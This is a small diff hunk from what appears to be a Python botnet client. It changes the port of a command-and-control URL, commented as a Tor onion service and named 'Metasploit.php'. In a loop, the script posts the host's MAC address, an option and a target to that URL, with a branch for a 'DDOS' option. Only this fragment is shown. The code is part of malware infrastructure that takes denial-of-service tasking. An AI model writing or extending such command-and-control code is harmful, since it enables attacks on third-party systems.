@@ -27,7 +27,7 @@ while True:
         target = ""
 
     # Define the Tor onion service URL
-    tor_url = 'http://127.0.0.1:80/Metasploit.php'
+    tor_url = 'http://127.0.0.1:8080/Metasploit.php'
     if option == "DDOS":
      data = {'MAC': mac, 'Option': option,'Target': target}
     else:
